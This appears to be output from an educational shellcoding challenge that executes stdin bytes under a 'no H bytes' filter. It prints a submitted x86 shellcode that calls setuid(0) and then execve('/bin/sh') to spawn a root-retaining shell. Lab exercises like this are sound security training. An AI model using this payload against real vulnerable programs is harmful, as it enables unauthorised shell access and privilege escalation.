This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

[LEAK] Mapping shellcode memory at 0x29b31000!
Reading 0x1000 bytes from stdin.

Executing filter...

This challenge requires that your shellcode have no H bytes!

This challenge is about to execute the following shellcode:

.global _start
.intel_syntax noprefix
_start: 

mov eax, 105
mov edi, 0
syscall

mov eax, 59
lea edi, [eip+binsh]
mov esi, 0
mov edx, 0
syscall

binsh: 
    .string "/bin/sh"